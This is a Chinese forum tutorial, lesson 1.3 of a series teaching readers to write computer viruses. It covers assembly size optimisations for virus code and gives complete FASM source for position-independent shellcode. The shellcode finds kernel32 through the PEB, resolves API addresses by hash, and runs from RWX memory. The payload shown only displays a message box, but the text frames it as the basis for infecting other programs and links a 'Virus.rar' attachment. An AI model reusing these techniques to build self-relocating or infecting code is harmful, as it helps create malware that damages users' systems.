
# 【Anti Virus 专题】1.3 - 如何编写病毒代码

> 原文：[`www.pediy.com/kssd/pediy10/87285.html`](https://www.pediy.com/kssd/pediy10/87285.html)

## 1.3. 如何编写病毒代码

上个星期由于演讲，导致没有时间拟写文章，今日将此篇文章赶出来，大家接着看吧，这个专题我肯定是持续更新的，请大家放心，只不过部分时候可能会有紧急事情导致没有办法随时更新。

首先我想你如果学习了前面课程的话，回答这节课程标题的提问肯定是没有问题的。如何编写病毒代码？

首先我把最重要的两个方面列举出来。

1. 处理病毒各个绝对地址的重定位。
2. 所有需调用的 api 函数地址，均通过动态搜索来获得。

做到以上 2 点，我们的病毒代码就可以移植到任意的程序中。没错，就和我们写 `shellcode` 一样。那么首先前面两部分我们在之前的“1.2 编写病毒所需掌握的知识中”已经给大家深入的讲解了。

今天呢，我就给大家再继续讲解“编写病毒代码需要注意到的地方”，并把前面讲解过的内容做一个串联，我们来实践一下。

首先编写病毒代码最重要的地方莫过于优化了。或许现在大部分人不注重，但是作为一个 `vxer`，我觉得还是要多多注重，因为这体现我们对 `cpu` 指令集以及 `opcode` 掌握的程度等，早在一年前看到 `29adrocon` 的代码，代码很漂亮，当时看看自己的代码...........，随即就对优化产生了兴趣，紧接着最重要的是把优化运用到自己的编译器中。

### 1. 如何有效的优化代码

作为一个 `vxer` 我们要时常自己去发现一些字节优化等技巧，来展现在我们的代码中。举个很简单的例子，`ZeroMemory`。

```asm
;eax - pointer to buffer , ecx - length of buffer

_ZeroMemory:
@@:
    mov     byte [eax+ecx-1], 0  ;5 byte
    loop    @B     ;2 byte
    retn
```

另外我们的 `Virus` 代码要尽量避免使用局部变量来存储相关 `api` 函数的返回值，我们应通过 `pushad` `popad` 来尽量使用寄存器来存储变量。这样我们可以更有效控制字节大小，OK。举了上面的两个例子，我们来进入今天的主题如何有效的优化代码。

早在之前我们国外的 `DDT` 杂 1 期就有一篇文章《32 bit optimization》网上大部分的 32 位代码优化文章也是来自修改此篇文章，我们来看下这篇文章的介绍。

#### (1) 测试寄存器是否为 0

```asm
cmp     eax,00000000h             ; 6 bytes
jz      bribriblibli             ; 2 bytes (if jz is short)

optimization:
or      eax,eax                   ; 2 bytes
jz      bribriblibli              ; 2 bytes (if jz is short)
xchg    eax,ecx                   ; 1 byte
jecxz   bribriblibli             ; 2 bytes (if it is short)
```

#### (2) 测试寄存器是否为 -1

```asm
cmp     eax,0FFFFFFFFh            ; 6 bytes
jz      insumision               ; 2 bytes (if short)

optimization:
inc     eax                       ; 1 byte
xchg    eax,ecx                  ; 1 byte
jecxz   insumision               ; 2 bytes (if short)
dec     ecx                      ; 1 byte
inc     eax                      ; 1 byte
jz      insumision               ; 2 bytes
dec     eax                      ; 1 byte
```

#### (3) 寄存器清 0 并传送低位字数值

```asm
xor     eax,eax                   ; 2 bytes
mov     ax,word ptr [esi+6]       ; 4 bytes

optimization:
movzx   eax,word ptr [esi+6]      ; 4 bytes
```

#### (4) 关于 push 的优化

```asm
mov   eax, 50h                   ; 5 bytes

optimization:
push  50h                      ; 2 bytes
pop     eax                      ; 1 bytes
push   0                       ; 2 bytes
push   0                       ; 2 bytes
push   0                       ; 2 bytes
push   0                       ; 2 bytes
push   0                       ; 2 bytes
push   0                       ; 2 bytes
push   0                       ; 2 bytes

optimization:
xor   eax, eax                       ; 2 bytes
push   eax                 ; 1 byte
push   eax                 ; 1 byte
push   eax                 ; 1 byte
push   eax                 ; 1 byte
push   eax                 ; 1 byte
push   eax                 ; 1 byte
push   eax                 ; 1 byte
push   7                    ; 2 bytes
pop   ecx                  ; 1 byte
_loop:
    push   0                     ; 2 bytes
    loop   _loop                 ; 2 bytes
```

#### (5) 操作 FS 寄存器相关优化

```asm
push    dword ptr fs:[00000000h]      ; 6 bytes
mov     fs:[0],esp                   ; 6 bytes
[...]
pop     dword ptr fs:[00000000h]      ; 6 bytes

optimization:
xor     eax,eax                   ; 2 bytes
push    dword ptr fs:[eax]          ; 3 bytes
mov     fs:[eax],esp               ; 3 bytes
[...]
pop     dword ptr fs:[eax]           ; 3 bytes
```

#### (6) 字符串操作

```asm
mov al/ax/eax, [esi]            ; 2/3/2 bytes
inc esi                    ; 1 byte

optimization:
lodsb/w/d                    ; 1 or 2 byte
```

到达字符串尾部。

```asm
lea     edi,[ebp+ASCIIz_variable]    ; 6 bytes
@@1:
    cmp     byte ptr [edi],00h        ; 3 bytes
    inc     edi                      ; 1 byte
    jz      @@2                     ; 2 bytes
    jmp     @@1                     ; 2 bytes
@@2:
    inc     edi                      ; 1 byte

optimization:
lea     edi,[ebp+ASCIIz_variable]    ; 6 bytes
xor     al,al                   ; 2 bytes
@@1:
    scasb                       ; 1 byte
    jnz     @@1                  ; 2 bytes
```

#### (7) 乘法

```asm
mov     ecx,28h                 ; 5 bytes
mul     ecx                     ; 2 bytes

optimization:
imul    eax,eax,28h             ; 3 bytes
```

#### (8) 置 edx 寄存器为 0.

```asm
xor  edx, edx                ; 2 bytes

optimization:
cdq                    ; 1 bytes
```

#### (9) 交换寄存器 4 字节的顺序

```asm
mov eax, 00200000h               ; 5 bytes
bswap eax                ; 2 bytes
;eax = 00002000h now
```

#### (10) 乘 2、除 2

```asm
shl   eax, 1               ; 2 bytes
; *2
shr  eax, 1                  ; 2 bytes
; /2
```

#### (11) 分配堆栈空间

```asm
push    ebp                     ; 1 byte
mov     ebp,esp                 ; 2 bytes
sub     esp,20h                 ; 3 bytes

optimization:
enter   20h,00h                 ; 4 bytes
```

#### (12) 压入字符串指针时尽量使用

```asm
call  @f
db  'string', 0
@@:
```

OK。以上的优化我认为是一个 `asm coder` 起码要注重的。更好的优化意味着也是一个更好的病毒。好了，不理解的人，可能认为我是发疯，但是有谁知道沉浸中的乐趣呢？

### 2. 实例以病毒代码的思路开始 Write

代码：



`format PE GUI 4.0`  
`include 'win32ax.inc'`  

`section '.text' code readable writeable executable`  

`Shellcode:`  

`call GetKrnlBase`  
`call dels`  
`dels: pop ebx`  
`lea edi, [ebx + szFuncs - dels]`  

`push edi`  
`push eax`  
`call GetFuncAddress`  

`call @f`  
`db 'user32.dll', 0`  
`@@:`  
`call dword [edi] ; LoadLibrary user32`  

`push edi`  
`push eax`  
`call GetFuncAddress ; Get User32 Func`  

`mov edx, edi`  
`add edx, szText - szFuncs ; edx = szText`  

`xor eax, eax`  
`push eax`  
`push eax ; push szText`  
`push edx`  
`push eax`  
`call dword [edi+4] ; MessageBoxA`  
`ret`  

`;++`  
`;`  
`; int`  
`;   GetKrnlBase3(`  
`;    void`  
`;   )`  
`;`  
`; Routine Description:`  
`;`  
`;    获得 kernel32 基地址`  
`;`  
`; Arguments:`  
`;`  
`;    (esp)         - return address`  
`;`  
`;`  
`; Return Value:`  
`;`  
`;    eax  =  krnl32 base`  
`;`  
`;--`  

`GetKrnlBase:`  
`mov eax, [fs:30h]`  
`mov eax, [eax+0ch]`  
`mov eax, [eax+1ch]`  
`mov eax, [eax]`  
`mov eax, [eax+8h]`  
`ret`  

`;++`  
`;`  
`; int`  
`;   GetFuncAddress`  
`;    int hModule,`  
`;    int pHashStringList`  
`;   )`  
`;`  
`; Routine Description:`  
`;`  
`;   获取 HASH API 地址`  
`;`  
`; Arguments:`  
`;`  
`;    (esp)         - return address`  
`;    (esp+4*8+4)    - hModule`  
`;    (esp+4*8+8)    - pHashStringList`  
`;`  
`; Return Value:`  
`;`  
`;    nothing`  
`;`  
`;--`  

`GetFuncAddress:`  
`pushad`  
`mov ebx, [esp+4*8+4] ; ebx  = hModule`  
`mov edx, [ebx+3ch] ; PE`  
`mov esi, [ebx+edx+78h] ; Export Table RVA`  
`lea esi, [esi+ebx+18h] ; Export Table VA+18h NumberOfNames`  
`lodsd`  
`xchg eax, ecx`  
`lodsd`  
`add eax, ebx`  
`xchg eax, ebp ; ebp   = AddressOfFunctions`  
`lodsd`  
`add eax, ebx`  
`xchg eax, edx ; edx  = AddressOfNames`  
`lodsd`  
`add eax, ebx`  
`push eax ; [esp] = AddressOfNameOrdinals`  

`mov esi, edx`  
`.Next_Func:`  
`lodsd`  
`add eax, ebx`  

`; Make Func Hash`  
`xor edx, edx`  
`.Make_Hash:`  
`rol edx, 3`  
`xor dl, byte [eax]`  
`inc eax`  
`cmp byte [eax], 0`  
`jnz .Make_Hash`  

`mov eax, [esp]`  
`add dword [esp], 2`  

`mov edi, [esp+4*8+8+4] ; edi  = pHashStringList`  
`.Scan_Dw_Funcs:`  
`cmp dword [edi], edx`  
`jnz .Next_List`  

`movzx eax, word [eax]`  
`mov eax, [ebp+eax*4]`  
`add eax, ebx`  
`stosd`  
`jmp .Ret`  

`.Next_List:`  
`scasd`  
`cmp dword [edi], 0`  
`jnz .Scan_Dw_Funcs`  
`.Ret:`  
`loop .Next_Func`  
`pop ecx`  
`popad`  
`ret 4*2`  

`;++`  
`;`  
`; Hash Function List`  
`;`  
`;--`  
`szFuncs:`  
`dd 0A412FD89h ;LoadLibraryA`  
`dd 014D14C51h ;MessageBoxA`  
`dd 0`  

`szText db '如何编写病毒代码例子', 0`  

`ShellCodeSize = $ - Shellcode`  

`entry $`  

`invoke VirtualAlloc, 0, ShellCodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE`  
`pushad`  
`push ShellCodeSize`  
`pop ecx`  
`push Shellcode`  
`pop esi`  
`xchg eax, edi`  
`rep movsb`  
`popad`  
`call eax`  
`ret`  

`data import`  
`library kernel32, 'kernel32.dll'`  
`include 'api\kernel32.inc'`  
`end data`

此代码例子，是首先通过`VirtualAlloc`申请一段`ShellCodeSize`大小的可读可写可执行内存区，然后将我们按照病毒思路编写的`Shellcode` Copy 到申请的内存区中。然后`call eax,`，跳转到我们申请的内存区中去执行。

从这个例子我们可以看到，我们的`Shellcode(Virus Code)`可以移植到任意的内存地址中去执行，它完成了我们预期想要的目的。

另外：我们下节课大家可以看到我们的病毒代码是整个处理重定位，并整个代码都是通过动态搜索获得。所以我们感染的时候是将整个病毒代码给`patch`到目标程序中。

好了，今天这节课程就到这里了。大家一定要多写程序，这样才能更好的理解。

最后祝愿大家有个好心情。

附件为代码和`bin`

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `Virus.rar` [解压密码：`pediy`] |
